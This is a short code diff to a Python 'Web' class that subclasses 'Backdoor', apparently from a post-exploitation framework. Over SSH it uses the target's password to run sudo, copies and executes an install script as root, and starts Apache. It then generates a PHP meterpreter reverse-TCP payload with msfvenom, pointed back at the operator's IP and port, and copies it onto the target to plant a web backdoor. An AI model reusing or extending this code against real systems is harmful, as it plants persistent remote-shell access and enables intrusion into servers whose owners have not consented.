@@ -24,9 +24,10 @@ class Web(Backdoor):
     def do_exploit(self, args):
         port = self.get_value("port")
 	name = self.get_value("name")
-	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S apt-get install lamp-server^")
+	self.target.scpFiles(self, "web/install.sh", False)
+	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S bash install.sh")
 	print("Installing LAMP stack.")
-	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S service apache2 restart")
+	#self.target.ssh.exec_command("echo password | sudo -S apt-get install apache2")
 	print("Starting Apache server.")
 	os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + self.core.localIP + " LPORT=" + str(port) + " -f raw > " + name) 
 	self.target.scpFiles(self, name, False)
